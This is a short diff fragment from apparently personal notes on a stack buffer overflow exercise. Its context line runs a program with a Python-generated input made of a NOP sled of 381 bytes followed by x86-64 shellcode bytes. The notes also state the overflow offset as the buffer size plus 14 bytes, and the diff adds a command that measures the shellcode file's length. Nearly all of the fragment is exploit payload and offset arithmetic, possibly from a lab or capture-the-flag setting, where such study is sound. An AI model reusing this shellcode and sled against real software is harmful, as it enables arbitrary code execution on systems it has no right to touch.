@@ -49,4 +49,6 @@ run Mr $(python -c 'print "\x90" * 381 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x
 To overflow the buffer 
  [buffersize] + 8 + 6 in bytes
  
+ wc -c sc
+ 
  
